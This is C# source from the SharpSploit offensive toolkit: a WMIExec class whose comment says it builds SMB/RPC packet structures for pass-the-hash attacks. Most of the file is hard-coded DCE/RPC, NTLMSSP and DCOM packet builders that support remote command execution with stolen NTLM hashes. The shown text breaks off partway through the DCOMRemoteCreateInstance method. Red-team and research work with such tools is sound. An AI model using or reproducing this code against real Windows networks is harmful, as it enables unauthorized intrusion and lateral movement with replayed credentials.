using SharpSploit.Misc;
using System;
using System.Collections.Specialized;
using System.Linq;
using System.Text;

namespace SharpSploit.Execution
{
    public class WMIExec
    {
        /// <summary>
        /// WMIExec contains all of the functions used to manually create SMB Packet Structures for Pass the Hash attacks.
        /// </summary>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        
        public static OrderedDictionary RPCBind(int packet_call_ID, byte[] packet_max_frag, byte[] packet_num_ctx_items, byte[] packet_context_ID, byte[] packet_UUID, byte[] packet_UUID_version)
        {

            byte[] packet_call_ID_bytes = BitConverter.GetBytes(packet_call_ID);

            OrderedDictionary packet_RPCBind = new OrderedDictionary();
            packet_RPCBind.Add("RPCBind_Version", new byte[] { 0x05 });
            packet_RPCBind.Add("RPCBind_VersionMinor", new byte[] { 0x00 });
            packet_RPCBind.Add("RPCBind_PacketType", new byte[] { 0x0b });
            packet_RPCBind.Add("RPCBind_PacketFlags", new byte[] { 0x03 });
            packet_RPCBind.Add("RPCBind_DataRepresentation", new byte[] { 0x10, 0x00, 0x00, 0x00 });
            packet_RPCBind.Add("RPCBind_FragLength", new byte[] { 0x48, 0x00 });
            packet_RPCBind.Add("RPCBind_AuthLength", new byte[] { 0x00, 0x00 });
            packet_RPCBind.Add("RPCBind_CallID", packet_call_ID_bytes);
            packet_RPCBind.Add("RPCBind_MaxXmitFrag", new byte[] { 0xb8, 0x10 });
            packet_RPCBind.Add("RPCBind_MaxRecvFrag", new byte[] { 0xb8, 0x10 });
            packet_RPCBind.Add("RPCBind_AssocGroup", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_RPCBind.Add("RPCBind_NumCtxItems", packet_num_ctx_items);
            packet_RPCBind.Add("RPCBind_Unknown", new byte[] { 0x00, 0x00, 0x00 });
            packet_RPCBind.Add("RPCBind_ContextID", packet_context_ID);
            packet_RPCBind.Add("RPCBind_NumTransItems", new byte[] { 0x01 });
            packet_RPCBind.Add("RPCBind_Unknown2", new byte[] { 0x00 });
            packet_RPCBind.Add("RPCBind_Interface", packet_UUID);
            packet_RPCBind.Add("RPCBind_InterfaceVer", packet_UUID_version);
            packet_RPCBind.Add("RPCBind_InterfaceVerMinor", new byte[] { 0x00, 0x00 });
            packet_RPCBind.Add("RPCBind_TransferSyntax", new byte[] { 0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60 });
            packet_RPCBind.Add("RPCBind_TransferSyntaxVer", new byte[] { 0x02, 0x00, 0x00, 0x00 });


            if (packet_num_ctx_items[0] == 2)
            {
                packet_RPCBind.Add("RPCBind_ContextID2", new byte[] { 0x01, 0x00 });
                packet_RPCBind.Add("RPCBind_NumTransItems2", new byte[] { 0x01 });
                packet_RPCBind.Add("RPCBind_Unknown3", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_Interface2", new byte[] { 0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10, 0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a });
                packet_RPCBind.Add("RPCBind_InterfaceVer2", new byte[] { 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_InterfaceVerMinor2", new byte[] { 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_TransferSyntax2", new byte[] { 0x2c, 0x1c, 0xb7, 0x6c, 0x12, 0x98, 0x40, 0x45, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_TransferSyntaxVer2", new byte[] { 0x01, 0x00, 0x00, 0x00 });
            }
            else if (packet_num_ctx_items[0] == 3)
            {
                packet_RPCBind.Add("RPCBind_ContextID2", new byte[] { 0x01, 0x00 });
                packet_RPCBind.Add("RPCBind_NumTransItems2", new byte[] { 0x01 });
                packet_RPCBind.Add("RPCBind_Unknown3", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_Interface2", new byte[] { 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
                packet_RPCBind.Add("RPCBind_InterfaceVer2", new byte[] { 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_InterfaceVerMinor2", new byte[] { 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_TransferSyntax2", new byte[] { 0x33, 0x05, 0x71, 0x71, 0xba, 0xbe, 0x37, 0x49, 0x83, 0x19, 0xb5, 0xdb, 0xef, 0x9c, 0xcc, 0x36 });
                packet_RPCBind.Add("RPCBind_TransferSyntaxVer2", new byte[] { 0x01, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_ContextID3", new byte[] { 0x02, 0x00 });
                packet_RPCBind.Add("RPCBind_NumTransItems3", new byte[] { 0x01 });
                packet_RPCBind.Add("RPCBind_Unknown4", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_Interface3", new byte[] { 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
                packet_RPCBind.Add("RPCBind_InterfaceVer3", new byte[] { 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_InterfaceVerMinor3", new byte[] { 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_TransferSyntax3", new byte[] { 0x2c, 0x1c, 0xb7, 0x6c, 0x12, 0x98, 0x40, 0x45, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_TransferSyntaxVer3", new byte[] { 0x01, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_AuthType", new byte[] { 0x0a });
                packet_RPCBind.Add("RPCBind_AuthLevel", new byte[] { 0x04 });
                packet_RPCBind.Add("RPCBind_AuthPadLength", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_AuthReserved", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_ContextID4", new byte[] { 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_Identifier", new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00 });
                packet_RPCBind.Add("RPCBind_MessageType", new byte[] { 0x01, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_NegotiateFlags", new byte[] { 0x97, 0x82, 0x08, 0xe2 });
                packet_RPCBind.Add("RPCBind_CallingWorkstationDomain", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_CallingWorkstationName", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_OSVersion", new byte[] { 0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f });
            }

            if (packet_call_ID == 3)
            {
                packet_RPCBind.Add("RPCBind_AuthType", new byte[] { 0x0a });
                packet_RPCBind.Add("RPCBind_AuthLevel", new byte[] { 0x02 });
                packet_RPCBind.Add("RPCBind_AuthPadLength", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_AuthReserved", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_ContextID3", new byte[] { 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_Identifier", new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00 });
                packet_RPCBind.Add("RPCBind_MessageType", new byte[] { 0x01, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_NegotiateFlags", new byte[] { 0x97, 0x82, 0x08, 0xe2 });
                packet_RPCBind.Add("RPCBind_CallingWorkstationDomain", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_CallingWorkstationName", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_OSVersion", new byte[] { 0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f });
            }

            return packet_RPCBind;
        }
        public static OrderedDictionary RPCAuth3(byte[] packet_NTLMSSP)
        {
            //4 extra bytes?
            byte[] packet_NTLMSSP_length = BitConverter.GetBytes(packet_NTLMSSP.Length);
            packet_NTLMSSP_length = new byte[] { packet_NTLMSSP_length[0], packet_NTLMSSP_length[1] };

            byte[] packet_RPC_length = BitConverter.GetBytes(packet_NTLMSSP.Length + 28);
            packet_RPC_length = new byte[] { packet_RPC_length[0], packet_RPC_length[1] };


            OrderedDictionary packet_RPCAuth3 = new OrderedDictionary();
            packet_RPCAuth3.Add("RPCAUTH3_Version", new byte[] { 0x05 });
            packet_RPCAuth3.Add("RPCAUTH3_VersionMinor", new byte[] { 0x00 });
            packet_RPCAuth3.Add("RPCAUTH3_PacketType", new byte[] { 0x10 });
            packet_RPCAuth3.Add("RPCAUTH3_PacketFlags", new byte[] { 0x03 });
            packet_RPCAuth3.Add("RPCAUTH3_DataRepresentation", new byte[] { 0x10, 0x00, 0x00, 0x00 });
            packet_RPCAuth3.Add("RPCAUTH3_FragLength", packet_RPC_length);
            packet_RPCAuth3.Add("RPCAUTH3_AuthLength", packet_NTLMSSP_length);
            packet_RPCAuth3.Add("RPCAUTH3_CallID", new byte[] { 0x03, 0x00, 0x00, 0x00 });
            packet_RPCAuth3.Add("RPCAUTH3_MaxXmitFrag", new byte[] { 0xd0, 0x16 });
            packet_RPCAuth3.Add("RPCAUTH3_MaxRecvFrag", new byte[] { 0xd0, 0x16 });
            packet_RPCAuth3.Add("RPCAUTH3_AuthType", new byte[] { 0x0a });
            packet_RPCAuth3.Add("RPCAUTH3_AuthLevel", new byte[] { 0x02 });
            packet_RPCAuth3.Add("RPCAUTH3_AuthPadLength", new byte[] { 0x00 });
            packet_RPCAuth3.Add("RPCAUTH3_AuthReserved", new byte[] { 0x00 });
            packet_RPCAuth3.Add("RPCAUTH3_ContextID", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_RPCAuth3.Add("RPCAUTH3_NTLMSSP", packet_NTLMSSP);

            return packet_RPCAuth3;
        }
        public static OrderedDictionary RPCRequest(byte[] packet_flags, int packet_service_length, int packet_auth_length, int packet_auth_padding, byte[] packet_call_ID, byte[] packet_context_ID, byte[] packet_opnum, byte[] packet_data)
        {
            int packet_full_auth_length;
            byte[] packet_write_length;
            byte[] packet_alloc_hint;
            if (packet_auth_length > 0)
            {
                packet_full_auth_length = packet_auth_length + packet_auth_padding + 8;
            }
            else
            {
                packet_full_auth_length = 0;
            }


            if (packet_data != null)
            {
                packet_write_length = BitConverter.GetBytes(packet_service_length + 24 + packet_full_auth_length + packet_data.Length);
                packet_alloc_hint = BitConverter.GetBytes(packet_service_length + packet_data.Length);
            }
            else
            {
                //Doing this because sometimes he calls it with 7 params instead of 8, which Powershell outputs the length to 0.
                packet_write_length = BitConverter.GetBytes(packet_service_length + 24 + packet_full_auth_length);
                packet_alloc_hint = BitConverter.GetBytes(packet_service_length);

            }

            byte[] packet_frag_length = { packet_write_length[0], packet_write_length[1] };
            byte[] packet_auth_length2 = BitConverter.GetBytes(packet_auth_length);
            byte[] packet_auth_length3 = { packet_auth_length2[0], packet_auth_length2[1] };

            OrderedDictionary packet_RPCRequest = new OrderedDictionary();
            packet_RPCRequest.Add("RPCRequest_Version", new byte[] { 0x05 });
            packet_RPCRequest.Add("RPCRequest_VersionMinor", new byte[] { 0x00 });
            packet_RPCRequest.Add("RPCRequest_PacketType", new byte[] { 0x00 });
            packet_RPCRequest.Add("RPCRequest_PacketFlags", packet_flags);
            packet_RPCRequest.Add("RPCRequest_DataRepresentation", new byte[] { 0x10, 0x00, 0x00, 0x00 });
            packet_RPCRequest.Add("RPCRequest_FragLength", packet_frag_length);
            packet_RPCRequest.Add("RPCRequest_AuthLength", packet_auth_length3);
            packet_RPCRequest.Add("RPCRequest_CallID", packet_call_ID);
            packet_RPCRequest.Add("RPCRequest_AllocHint", packet_alloc_hint);
            packet_RPCRequest.Add("RPCRequest_ContextID", packet_context_ID);
            packet_RPCRequest.Add("RPCRequest_Opnum", packet_opnum);

            if (packet_data != null && packet_data.Length > 0)
            {
                packet_RPCRequest.Add("RPCRequest_Data", packet_data);
            }

            return packet_RPCRequest;

        }
        public static OrderedDictionary RPCAlterContext(byte[] packet_assoc_group, byte[] packet_call_ID, byte[] packet_context_ID, byte[] packet_interface_UUID)
        {
            OrderedDictionary packet_RPCAlterContext = new OrderedDictionary();
            packet_RPCAlterContext.Add("RPCAlterContext_Version", new byte[] { 0x05 });
            packet_RPCAlterContext.Add("RPCAlterContext_VersionMinor", new byte[] { 0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_PacketType", new byte[] { 0x0e });
            packet_RPCAlterContext.Add("RPCAlterContext_PacketFlags", new byte[] { 0x03 });
            packet_RPCAlterContext.Add("RPCAlterContext_DataRepresentation", new byte[] { 0x10, 0x00, 0x00, 0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_FragLength", new byte[] { 0x48, 0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_AuthLength", new byte[] { 0x00, 0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_CallID", packet_call_ID);
            packet_RPCAlterContext.Add("RPCAlterContext_MaxXmitFrag", new byte[] { 0xd0, 0x16 });
            packet_RPCAlterContext.Add("RPCAlterContext_MaxRecvFrag", new byte[] { 0xd0, 0x16 });
            packet_RPCAlterContext.Add("RPCAlterContext_AssocGroup", packet_assoc_group);
            packet_RPCAlterContext.Add("RPCAlterContext_NumCtxItems", new byte[] { 0x01 });
            packet_RPCAlterContext.Add("RPCAlterContext_Unknown", new byte[] { 0x00, 0x00, 0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_ContextID", packet_context_ID);
            packet_RPCAlterContext.Add("RPCAlterContext_NumTransItems", new byte[] { 0x01 });
            packet_RPCAlterContext.Add("RPCAlterContext_Unknown2", new byte[] { 0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_Interface", packet_interface_UUID);
            packet_RPCAlterContext.Add("RPCAlterContext_InterfaceVer", new byte[] { 0x00, 0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_InterfaceVerMinor", new byte[] { 0x00, 0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_TransferSyntax", new byte[] { 0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60 });
            packet_RPCAlterContext.Add("RPCAlterContext_TransferSyntaxVer", new byte[] { 0x02, 0x00, 0x00, 0x00 });

            packet_RPCAlterContext.Add("", new byte[] { });

            return packet_RPCAlterContext;
        }
        public static OrderedDictionary NTLMSSPVerifier(int packet_auth_padding, byte[] packet_auth_level, byte[] packet_sequence_number)
        {
            OrderedDictionary packet_NTLMSSPVerifier = new OrderedDictionary();
            byte[] packet_auth_pad_length = null;

            if (packet_auth_padding == 4)
            {
                packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding", new byte[] { 0x00, 0x00, 0x00, 0x00 });
                packet_auth_pad_length = new byte[] { 0x04 };
            }
            else if (packet_auth_padding == 8)
            {
                packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_auth_pad_length = new byte[] { 0x08 };
            }
            else if (packet_auth_padding == 12)
            {
                packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_auth_pad_length = new byte[] { 0x0c };
            }
            else
            {
                packet_auth_pad_length = new byte[] { 0x00 };
            }

            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthType", new byte[] { 0x0a });
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthLevel", packet_auth_level);
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadLen", packet_auth_pad_length);
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthReserved", new byte[] { 0x00 });
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_ContextID", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierVersionNumber", new byte[] { 0x01, 0x00, 0x00, 0x00 });
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierChecksum", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierSequenceNumber", packet_sequence_number);

            return packet_NTLMSSPVerifier;
        }
        public static OrderedDictionary DCOMRemQueryInterface(byte[] packet_causality_ID, byte[] packet_IPID, byte[] packet_IID)
        {
            OrderedDictionary packet_DCOMRemQueryInterface = new OrderedDictionary();

            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_VersionMajor", new byte[] { 0x05, 0x00 });
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_VersionMinor", new byte[] { 0x07, 0x00 });
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Flags", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Reserved", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_CausalityID", packet_causality_ID);
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Reserved2", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_IPID", packet_IPID);
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Refs", new byte[] { 0x05, 0x00, 0x00, 0x00 });
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_IIDs", new byte[] { 0x01, 0x00 });
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Unknown", new byte[] { 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 });
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_", packet_IID);

            return packet_DCOMRemQueryInterface;
        }
        public static OrderedDictionary DCOMRemRelease(byte[] packet_causality_ID, byte[] packet_IPID, byte[] packet_IPID2)
        {
            OrderedDictionary packet_DCOMRemRelease = new OrderedDictionary();
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_VersionMajor", new byte[] { 0x05, 0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_VersionMinor", new byte[] { 0x07, 0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_Flags", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_Reserved", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_CausalityID", packet_causality_ID);
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_Reserved2", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_Unknown", new byte[] { 0x02, 0x00, 0x00, 0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_InterfaceRefs", new byte[] { 0x02, 0x00, 0x00, 0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_IPID", packet_IPID);
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_PublicRefs", new byte[] { 0x05, 0x00, 0x00, 0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_PrivateRefs", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_packet_IPID2", packet_IPID2);
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_PublicRefs2", new byte[] { 0x05, 0x00, 0x00, 0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_PrivateRefs2", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            return packet_DCOMRemRelease;
        }
        public static OrderedDictionary DCOMRemoteCreateInstance(byte[] packet_causality_ID, string packet_target)
        {

            byte[] packet_target_unicode = Encoding.Unicode.GetBytes(packet_target);
            byte[] packet_target_length = BitConverter.GetBytes(packet_target.Length + 1);
            double bytesize = (Math.Truncate((double)packet_target_unicode.Length / 8 + 1) * 8) - packet_target_unicode.Length;
            packet_target_unicode = packet_target_unicode.Concat(new byte[Convert.ToInt32(bytesize)]).ToArray();
            byte[] packet_cntdata = BitConverter.GetBytes(packet_target_unicode.Length + 720);
            byte[] packet_size = BitConverter.GetBytes(packet_target_unicode.Length + 680);
            byte[] packet_total_size = BitConverter.GetBytes(packet_target_unicode.Length + 664);
            byte[] packet_private_header = BitConverter.GetBytes(packet_target_unicode.Length + 40).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
            byte[] packet_property_data_size = BitConverter.GetBytes(packet_target_unicode.Length + 56);

            OrderedDictionary packet_DCOMRemoteCreateInstance = new OrderedDictionary();
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMVersionMajor", new byte[] { 0x05, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMVersionMinor", new byte[] { 0x07, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMFlags", new byte[] { 0x01, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMReserved", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMCausalityID", packet_causality_ID);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown2", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown3", new byte[] { 0x00, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown4", packet_cntdata);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCntData", packet_cntdata);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFSignature", new byte[] { 0x4d, 0x45, 0x4f, 0x57 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFFlags", new byte[] { 0x04, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFIID", new byte[] { 0xa2, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFCLSID", new byte[] { 0x38, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFCBExtension", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFSize", packet_size);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesTotalSize", packet_total_size);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesReserved", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderPrivateHeader", new byte[] { 0xb0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderTotalSize", packet_total_size);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCustomHeaderSize", new byte[] { 0xc0, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderReserved", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesDestinationContext", new byte[] { 0x02, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesNumActivationPropertyStructs", new byte[] { 0x06, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsInfoClsid", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrReferentID", new byte[] { 0x00, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrReferentID", new byte[] { 0x04, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesNULLPointer", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrMaxCount", new byte[] { 0x06, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid", new byte[] { 0xb9, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid2", new byte[] { 0xab, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid3", new byte[] { 0xa5, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid4", new byte[] { 0xa6, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid5", new byte[] { 0xa4, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid6", new byte[] { 0xaa, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrMaxCount", new byte[] { 0x06, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize", new byte[] { 0x68, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize2", new byte[] { 0x58, 0x00, 0x00, 0x00 });
